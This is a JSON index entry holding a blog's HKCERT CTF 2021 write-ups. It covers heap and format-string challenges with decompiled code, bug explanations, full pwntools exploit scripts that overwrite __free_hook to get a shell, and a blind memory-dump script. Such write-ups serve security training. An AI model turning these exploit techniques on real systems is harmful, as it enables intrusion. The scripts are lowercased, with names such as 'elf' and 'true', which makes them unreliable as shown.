
{
    
    
    
    
        
    
    "pages": [{"date":"2021-11-17","image":"","link":"https://bott0m.github.io/posts/hkcertctf-2021-writeups/","summary":"","tags":["ctf"],"text":"hkcert21 - t0028 - writeups easyheap step 1: find the vulnerability void add(void) { char size; int user_index; int i; void *user_ptr; void *msg_ptr; user_index = 999; i = 0; do { if (0x13 \u0026lt; i) { lab_001013cc: if (user_index == 999) { puts(\u0026#34;can not add now\u0026#34;); } else { user_ptr = calloc(0x20,1); /* 123 */ *(void **)(\u0026amp;user_storage + (long)user_index * 8) = user_ptr; **(undefined4 **)(\u0026amp;user_storage + (long)user_index * 8) = 0; *(int *)(*(long *)(\u0026amp;user_storage + (long)user_index * 8) + 4) = dat_0010403c; dat_0010403c = dat_0010403c + 1; puts(\u0026#34;enter the message size for the user : \u0026#34;); __isoc99_scanf(\u0026amp;dat_0010203f,\u0026amp;size); if (size \u0026lt; \u0026#39;\\x01\u0026#39;) { puts(\u0026#34;bye hacker\u0026#34;); /* warning: subroutine does not return */ exit(0); } *(char *)(*(long *)(\u0026amp;user_storage + (long)user_index * 8) + 8) = size; msg_ptr = calloc((long)size,1); puts(\u0026#34;input message content \u0026gt;\u0026gt;\u0026#34;); read_all(msg_ptr,(int)size); *(void **)(*(long *)(\u0026amp;user_storage + (long)user_index * 8) + 0x18) = msg_ptr; } return; } if (*(long *)(\u0026amp;user_storage + (long)i * 8) == 0) { user_index = i; goto lab_001013cc; } i = i + 1; } while( true ); } void edit(void) { int index; char size; puts(\u0026#34;which user?\u0026#34;); __isoc99_scanf(\u0026amp;dat_00102074,\u0026amp;index); if ((index \u0026lt; 0) || (0x13 \u0026lt; index)) { puts(\u0026#34;out of range detected\u0026#34;); } else { if (*(long *)(\u0026amp;user_storage + (long)index * 8) == 0) { puts(\u0026#34;bye hacker\u0026#34;); /* warning: subroutine does not return */ exit(0); } size = *(char *)(*(long *)(\u0026amp;user_storage + (long)index * 8) + 8); puts(\u0026#34;input message content \u0026gt;\u0026gt;\u0026#34;); read_all(*(undefined8 *)(*(long *)(\u0026amp;user_storage + (long)index * 8) + 0x18),size + -1); *(char *)(*(long *)(\u0026amp;user_storage + (long)index * 8) + 8) = *(char *)(*(long *)(\u0026amp;user_storage + (long)index * 8) + 8) + -1; } return; } in add function, after created a user_ptr, the program will store the size in *user_ptr+8.\n*(char *)(*(long *)(\u0026amp;user_storage + (long)user_index * 8) + 8) = size; in edit function, the program will read size-1 byte and decrease the size and store it when we are finished editing.\nread_all(*(undefined8 *)(*(long *)(\u0026amp;user_storage + (long)index * 8) + 0x18),size + -1); *(char *)(*(long *)(\u0026amp;user_storage + (long)index * 8) + 8) = *(char *)(*(long *)(\u0026amp;user_storage + (long)index * 8) + 8) + -1; step2: exploit the bug therefore, we can exploit it to get a unlimited size.\n we create a size = 1 chunks. we edit it once, the program will decrease the size to be 0 if we edit it again, the read size will become negative number.  which mean we got a most unlimited size to write our data into the chunk.\nthought this bug, we can create overflow the data to change the size of neighbour chunk\u0026rsquo;s size (this size is the chunk size not the read size) and free it to have a unsorted bin and cause chunks overlap.\nadd(1, \u0026#34;a\u0026#34;) # chunks for padding for i in range(9): add(0x40, b\u0026#34;/bin/sh\\x00\u0026#34;) edit(0, \u0026#34;\\n\u0026#34;) # change the size of neighbour payload = p64(0)*3 + p64(0x431) edit(0, payload) # free it to get a unsorted bin remove(1) step 3: leak libc address then, we padding the first chunk to leak and get the libc_base address\nview(0) p.recvuntil(\u0026#34;a\u0026#34;*0x20) libc_base = u64(p.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) - 0x1ebbe0 info(f\u0026#34;libc_base: {hex(libc_base)}\u0026#34;) free_hook = libc_base + libc.symbols[\u0026#39;__free_hook\u0026#39;] system = libc_base + libc.symbols[\u0026#39;system\u0026#39;] info(f\u0026#34;free_hook: {hex(free_hook)}\u0026#34;) step 4: get shell the last step is edit the first to write __free_hook to victim chunk and edit the victim with system to get shell\npayload = p64(free_hook) * 24 edit(0, payload) edit(2, p64(system)) remove(5) full exploit script:\nfrom pwn import * target = \u0026#39;./heap\u0026#39; host = \u0026#39;chalp.hkcert21.pwnable.hk\u0026#39; port = 28359 context.arch = \u0026#39;amd64\u0026#39; # i386/amd64 context.log_level = \u0026#39;debug\u0026#39; elf = elf(target) if len(sys.argv) \u0026gt; 1 and sys.argv[1] == \u0026#39;remote\u0026#39;: p = remote(host, port) libc = elf(\u0026#39;./libc-2.31.so\u0026#39;) else: p = process(target, env={\u0026#34;ld_preload\u0026#34;: \u0026#34;./libc-2.31.so\u0026#34;}) libc = elf.libc gdbscript = \u0026#39;\u0026#39;\u0026#39; c heap chunks heap bins\u0026#39;\u0026#39;\u0026#39; if len(sys.argv) \u0026gt; 1 and sys.argv[1] == \u0026#39;gdb\u0026#39;: gdb.attach(p, gdbscript=gdbscript) #--- def add(size, data): p.sendlineafter(\u0026#34;$\u0026#34;, \u0026#34;1\u0026#34;) p.sendlineafter(\u0026#34;enter the message size for the user :\u0026#34;, str(size)) p.sendafter(\u0026#34;input message content \u0026gt;\u0026gt;\u0026#34;, data) def view(idx): p.sendlineafter(\u0026#34;$\u0026#34;, \u0026#34;2\u0026#34;) p.sendlineafter(\u0026#34;want to check the message of which user?\u0026#34;, str(idx)) def edit(idx, data): p.sendlineafter(\u0026#34;$\u0026#34;, \u0026#34;3\u0026#34;) p.sendlineafter(\u0026#34;which user?\u0026#34;, str(idx)) p.sendafter(\u0026#34;input message content \u0026gt;\u0026gt;\u0026#34;, data) def remove(idx): p.sendlineafter(\u0026#34;$\u0026#34;, \u0026#34;4\u0026#34;) p.sendlineafter(\u0026#34;delete which user?\u0026#34;, str(idx)) add(1, \u0026#34;a\u0026#34;) # chunks for padding for i in range(9): add(0x40, b\u0026#34;/bin/sh\\x00\u0026#34;) edit(0, \u0026#34;\\n\u0026#34;) # change the size of neighbour payload = p64(0)*3 + p64(0x431) edit(0, payload) # free it to get a unsorted bin remove(1) payload = \u0026#39;a\u0026#39;*0x20 edit(0, payload) view(0) p.recvuntil(\u0026#34;a\u0026#34;*0x20) libc_base = u64(p.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) - 0x1ebbe0 info(f\u0026#34;libc_base: {hex(libc_base)}\u0026#34;) free_hook = libc_base + libc.symbols[\u0026#39;__free_hook\u0026#39;] system = libc_base + libc.symbols[\u0026#39;system\u0026#39;] info(f\u0026#34;free_hook: {hex(free_hook)}\u0026#34;) payload = p64(free_hook) * 24 edit(0, payload) edit(2, p64(system)) remove(5) p.interactive() unobserved box step 1: dump the source code throught format string this challenge only give us the server to connect. my teammate tell me this challenge may have format string vulnerability when i was sleeping.\n┌──(bot3310㉿kali)-[~/ctf/hkcert2021/box] └─$ nc chalp.hkcert21.pwnable.hk 28132 130 ⨯ 1 ⚙ %p %x %c %d 0x7ffee2d4b670 e2d4b670 1179970944 is not the correct answer. after i few tries, we can\u0026rsquo;t get any useful information from the server. however, i remember liveoverflow has a video talk about a challenge like this. https://www.youtube.com/watch?v=xuzufuguqv0\u0026amp;t=450s\ni wrote a script to dump the source file and pass it to my teammate to reverse it.\nfull dump script:\nfrom pwn import * target = \u0026#39;./\u0026#39; host = \u0026#39;chalp.hkcert21.pwnable.hk\u0026#39; port = 28132 context.arch = \u0026#39;amd64\u0026#39; # i386/amd64 context.log_level = \u0026#39;debug\u0026#39; #elf = elf(target) #--- output = b\u0026#39;\u0026#39; addr = 0x400000 def dump(addr): sleep(0.1) p = remote(host, port) p.sendline(b\u0026#34;%7$s||||\u0026#34; + p64(addr)) text = p.recvuntil(\u0026#34;||||\u0026#34;, timeout=5000)[:-4] p.close() print(f\u0026#34;trying {hex(addr)}: {str(text)}{len(text)}\u0026#34;) return text myfile = open(\u0026#34;dump\u0026#34;, \u0026#34;ab\u0026#34;) while true: try: if addr \u0026gt; 0x406000: break data = dump(addr) if len(data) == 0: myfile.write(b\u0026#39;\\x00\u0026#39;) addr += 1 else: myfile.write(data) addr += len(data) except exception as e: continue #p.interactive() step 2: reverse now that we have the binary, we can use decompilers like ghidra to look at the original code. there are 3 functions that interest us the most:\nundefined8 fun_0040142f(void) { int ivar1; char local_28 [32]; fun_004013d9(local_28,0x1f); ivar1 = fun_00401192(local_28); if (ivar1 == 1) { fun_004012c8(); } else { printf(local_28); puts(\u0026#34; is not the correct answer.\u0026#34;); } return 0; } void fun_004013d9(void *param_1,int param_2) { ssize_t svar1; svar1 = read(0,param_1,(long)param_2); if (*(char *)((long)param_1 + (long)(int)svar1 + -1) == \u0026#39;\\n\u0026#39;) { *(undefined *)((long)param_1 + (long)(int)svar1 + -1) = 0; } return; } in fun_0040142f, we can see the familiar \u0026lt;user_input\u0026gt; is not the correct answer. message is in the else block. so maybe we should try to satisfy the other branching condition, by making fun_00401192(local_28) == 1. in the last line, fun_004013d9(local_28,0x1f) is reading string from stdin and preforming some string operations, so local_28 shoud be our input string. let\u0026rsquo;s look at fun_00401192 to see when will this function return 1:\nundefined8 fun_00401192(char *param_1) { int ivar1; size_t svar2; undefined8 uvar3; svar2 = strlen(param_1); if (svar2 == 0x13) { if ((param_1[6] == \u0026#39;_\u0026#39;) \u0026amp;\u0026amp; (param_1[9] == param_1[6])) { ivar1 = strncmp(param_1,\u0026#34;printf\u0026#34;,6); if (ivar1 == 0) { ivar1 = strncmp(param_1 + 10,\u0026#34;danger\u0026#34;,6); if (ivar1 == 0) { if (param_1[0x12] == \u0026#39;s\u0026#39;) { if (param_1[0x11] == \u0026#39;u\u0026#39;) { if (param_1[0x10] == \u0026#39;o\u0026#39;) { if (param_1[2] == param_1[7]) { if (param_1[8] == param_1[0x12]) { uvar3 = 1; } else { uvar3 = 0; } } else { uvar3 = 0; } } else { uvar3 = 0; } } else { uvar3 = 0; } } else { uvar3 = 0; } } else { uvar3 = 0; } } else { uvar3 = 0; } } else { uvar3 = 0; } } else { uvar3 = 0; } return uvar3; } let s be the required string. we have\nlen(s) = 13 s[6] = s[9] = \u0026#39;_\u0026#39; s[1:5] = \u0026#39;printf\u0026#39; s[10:15] = \u0026#39;danger\u0026#39; s[16] = \u0026#39;o\u0026#39; s[17] = \u0026#39;u\u0026#39; s[18] = \u0026#39;s\u0026#39; s[2] = s[7] s[8] = s[18] which is \u0026quot;printf_is_dangerous\u0026quot;.\nfinally, send this string to the server and get flag:\n$ echo printf_is_dangerous | nc chalp.hkcert21.pwnable.hk 28132 hkcert21{l3aking_the_world_give_u_7h3_flag} flag: hkcert21{l3aking_the_world_give_u_7h3_flag}\nfortune cookie 1 step 1: fund the vulnerability this challenge has provided us the source code.\nin edit and read function, the program didn\u0026rsquo;t check the index smaller than 0.\nvoid edit_cookie() { long long idx; printf(\u0026#34;which cookie?[0-%d]: \u0026#34;, cookie_num-1); scanf(\u0026#34;%llu\u0026#34;, \u0026amp;idx); if (idx \u0026gt;= cookie_num) { _abort(\u0026#34;invalid index!\u0026#34;); } printf(\u0026#34;new message: \u0026#34;); int num_read = read(0, msg[idx], msg_size[idx]-1); if (msg[idx][num_read] == \u0026#39;\\n\u0026#39;) msg[idx][num_read] = \u0026#39;\\0\u0026#39;; printf(\u0026#34;done!\\n\\n\u0026#34;); } void read_cookie() { long long idx; printf(\u0026#34;which cookie?[0-%d]: \u0026#34;, cookie_num-1); scanf(\u0026#34;%llu\u0026#34;, \u0026amp;idx); if (idx \u0026gt;= cookie_num) { _abort(\u0026#34;invalid index!\u0026#34;); } printf(\u0026#34;%s\\n\\n\u0026#34;, msg[idx]); } which mean we can read and edit the data outside the msg array in the address below the msg location, i found a important address.\ngef➤ tele (double*)\u0026amp;msg-0x10 20 0x000055770ddb4fe0│+0x0000: 0x00007f3f8ad10750 → \u0026lt;__libc_start_main+0\u0026gt; push r14 0x000055770ddb4fe8│+0x0008: 0x0000000000000000 0x000055770ddb4ff0│+0x0010: 0x0000000000000000 0x000055770ddb4ff8│+0x0018: 0x00007f3f8ad2a2e0 → \u0026lt;__cxa_finalize+0\u0026gt; push r15 0x000055770ddb5000│+0x0020: 0x0000000000000000 0x000055770ddb5008│+0x0028: 0x000055770ddb5008 → [loop detected] 0x000055770ddb5010│+0x0030: 0x0000000000000000 0x000055770ddb5018│+0x0038: 0x0000000000000000 0x000055770ddb5020│+0x0040: 0x00007f3f8b0b5620 → 0x00000000fbad2887 0x000055770ddb5028│+0x0048: 0x0000000000000000 0x000055770ddb5030│+0x0050: 0x00007f3f8b0b48e0 → 0x00000000fbad208b 0x000055770ddb5038│+0x0058: 0x0000000000000000 0x000055770ddb5040│+0x0060: 0x00007f3f8b0b5540 → 0x00000000fbad2087 0x000055770ddb5048│+0x0068: 0x0000000000000000 0x000055770ddb5050│+0x0070: 0x0000000000000000 0x000055770ddb5058│+0x0078: 0x0000000000000000 0x000055770ddb5060│+0x0080: 0x000055770e9c5240 → \u0026#34;the best thing to do first thing in the morning is\u0026#34; 0x000055770ddb5068│+0x0088: 0x000055770e9c52a0 → \u0026#34;every 60 seconds in africa a minute passes.\u0026#34; 0x000055770ddb5070│+0x0090: 0x000055770e9c52e0 → \u0026#34;monday hates you, too.\u0026#34; 0x000055770ddb5078│+0x0098: 0x000055770e9c5300 → \u0026#34;money is not everything. there\u0026#39;s always credit car[...]\u0026#34; you can see in 0x000055770ddb5008, there has a address pointer to itself.\nwe can control this address by index -11 to get the arbitrary write and read.\nstep 2: leak address by input -11 to show function, we can leak the data of that address which is it\u0026rsquo;s address.\np.recv(7) target = u64(p.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) + 0x80 info(f\u0026#34;target: {hex(target)}\u0026#34;) for i in range(27): create(0x88, b\u0026#34;/bin/sh\\x00\u0026#34;) step 3: leak libc address  edit it point to our controlable place, which is the address to store #5 chunk address edit it point to 0x000055770ddb5020 where stored a address of libc show the #5 chunk to leak the libc address  target = leak + 0x80 edit(-11, p64(target)) edit(-11, p64(target-0x68)) show(5) p.recv(8) #input() libc_base = u64(p.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) - 0x3c5620 info(f\u0026#34;libc_base: {hex(libc_base)}\u0026#34;) free_hook = libc_base + libc.symbols[\u0026#39;__free_hook\u0026#39;] system = libc_base + libc.symbols[\u0026#39;system\u0026#39;] step 4: get shell change the place pointed to #5 chunk addrss point to __free_hook and edit it with system address. call eatcookie() to free a chunk contains /bin/sh` to get shell\nedit(-11, p64(free_hook)) edit(5, p64(system)) eat() full exploit script:\nfrom pwn import * target = \u0026#39;./chall\u0026#39; host = \u0026#39;chalp.hkcert21.pwnable.hk\u0026#39; port = 38230 context.arch = \u0026#39;amd64\u0026#39; # i386/amd64 #context.log_level = \u0026#39;debug\u0026#39; elf = elf(target) if len(sys.argv) \u0026gt; 1 and sys.argv[1] == \u0026#39;remote\u0026#39;: p = remote(host, port) libc = elf(\u0026#34;./libc-2.23.so\u0026#34;) else: p = process(target ,env = {\u0026#34;ld_preload\u0026#34;: \u0026#34;./libc-2.23.so\u0026#34;}) libc = elf.libc gdbscript = \u0026#39;\u0026#39;\u0026#39;\u0026#39;\u0026#39;\u0026#39; if len(sys.argv) \u0026gt; 1 and sys.argv[1] == \u0026#39;gdb\u0026#39;: gdb.attach(p, gdbscript=gdbscript) #--- def eat(): p.sendlineafter(\u0026#34;\u0026gt;\u0026#34;, \u0026#39;1\u0026#39;) def create(size, data): p.sendlineafter(\u0026#34;\u0026gt;\u0026#34;, \u0026#39;2\u0026#39;) p.sendlineafter(\u0026#34;how long is the message?\u0026#34;, str(size)) p.sendlineafter(\u0026#34;input your message:\u0026#34;, data) def edit(idx, data): p.sendlineafter(\u0026#34;\u0026gt;\u0026#34;, \u0026#39;3\u0026#39;) p.sendlineafter(\u0026#34;which cookie?\u0026#34;, str(idx)) p.sendafter(\u0026#34;new message:\u0026#34;, data) def show(idx): p.sendlineafter(\u0026#34;\u0026gt;\u0026#34;, \u0026#39;4\u0026#39;) p.sendlineafter(\u0026#34;which cookie?\u0026#34;, str(idx)) #print(p.recvline()) show(-11) p.recv(7) leak = u64(p.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) info(f\u0026#34;leak: {hex(leak)}\u0026#34;) for i in range(27): create(0x88, b\u0026#34;/bin/sh\\x00\u0026#34;) target = leak + 0x80 edit(-11, p64(target)) edit(-11, p64(target-0x68)) show(5) p.recv(8) #input() libc_base = u64(p.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) - 0x3c5620 info(f\u0026#34;libc_base: {hex(libc_base)}\u0026#34;) free_hook = libc_base + libc.symbols[\u0026#39;__free_hook\u0026#39;] system = libc_base + libc.symbols[\u0026#39;system\u0026#39;] edit(-11, p64(free_hook)) edit(5, p64(system)) eat() p.interactive() fortune cookie 2 this challenge has the source as fortune cookie 1 so i used the same exploit script with a little change related to the different of libc version.\nfull exploit script:\nfrom pwn import * target = \u0026#39;./chall\u0026#39; host = \u0026#39;chalp.hkcert21.pwnable.hk\u0026#39; port = 38231 context.arch = \u0026#39;amd64\u0026#39; # i386/amd64 #context.log_level = \u0026#39;debug\u0026#39; elf = elf(target) if len(sys.argv) \u0026gt; 1 and sys.argv[1] == \u0026#39;remote\u0026#39;: p = remote(host, port) libc = elf(\u0026#34;./libc-2.27.so\u0026#34;) else: p = process(target ,env = {\u0026#34;ld_preload\u0026#34;: \u0026#34;./libc-2.27.so\u0026#34;}) libc = elf.libc gdbscript = \u0026#39;\u0026#39;\u0026#39;\u0026#39;\u0026#39;\u0026#39; if len(sys.argv) \u0026gt; 1 and sys.argv[1] == \u0026#39;gdb\u0026#39;: gdb.attach(p, gdbscript=gdbscript) #--- def eat(): p.sendlineafter(\u0026#34;\u0026gt;\u0026#34;, \u0026#39;1\u0026#39;) def create(size, data): p.sendlineafter(\u0026#34;\u0026gt;\u0026#34;, \u0026#39;2\u0026#39;) p.sendlineafter(\u0026#34;how long is the message?\u0026#34;, str(size)) p.sendlineafter(\u0026#34;input your message:\u0026#34;, data) def edit(idx, data): p.sendlineafter(\u0026#34;\u0026gt;\u0026#34;, \u0026#39;3\u0026#39;) p.sendlineafter(\u0026#34;which cookie?\u0026#34;, str(idx)) p.sendafter(\u0026#34;new message:\u0026#34;, data) def show(idx): p.sendlineafter(\u0026#34;\u0026gt;\u0026#34;, \u0026#39;4\u0026#39;) p.sendlineafter(\u0026#34;which cookie?\u0026#34;, str(idx)) #print(p.recvline()) show(-11) p.recv(7) target = u64(p.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) + 0x80 info(f\u0026#34;target: {hex(target)}\u0026#34;) for i in range(27): create(0x88, b\u0026#34;/bin/sh\\x00\u0026#34;) # #input() edit(-11, p64(target)) edit(-11, p64(target-0x68)) show(5) p.recv(8) #input() libc_base = u64(p.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) -0x3ec760 info(f\u0026#34;libc_base: {hex(libc_base)}\u0026#34;) free_hook = libc_base + libc.symbols[\u0026#39;__free_hook\u0026#39;] system = libc_base + libc.symbols[\u0026#39;system\u0026#39;] edit(-11, p64(free_hook)) edit(5, p64(system)) print(\u0026#34;hi\u0026#34;) eat() p.interactive() ","title":"HKcertCTF 2021 Writeups"}]
}

